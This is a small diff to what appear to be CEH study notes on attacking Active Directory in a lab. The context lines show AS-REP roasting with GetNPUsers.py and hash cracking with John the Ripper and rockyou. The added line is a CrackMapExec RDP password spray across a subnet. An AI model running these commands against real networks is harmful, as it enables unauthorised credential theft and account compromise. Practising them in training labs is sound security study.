@@ -67,3 +67,4 @@ AD -->
 pyhon3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtool/user.txt -dc-ip 10.10.1.12
 john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
 
+cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
